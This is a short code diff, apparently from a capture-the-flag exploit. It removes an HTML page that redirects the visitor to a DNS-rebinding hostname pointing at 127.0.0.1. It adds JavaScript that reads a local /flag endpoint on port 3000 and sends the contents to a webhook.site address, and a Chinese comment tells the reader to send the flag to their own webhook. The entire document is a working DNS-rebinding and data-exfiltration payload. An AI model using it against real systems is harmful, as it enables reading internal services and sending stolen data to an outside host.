@@ -1,11 +1,6 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Redirecting...</title>
-</head>
-<body>
-    <script>
-        window.location.href = "http://b7ac240f.7f000001.rbndr.us";
-    </script>
-</body>
-</html>
+fetch('http://127.0.0.1:3000/flag')
+  .then(response => response.text())
+  .then(flag => {
+    // 將 flag 傳送到你的 webhook
+    fetch('https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?flag=' + encodeURIComponent(flag));
+  });
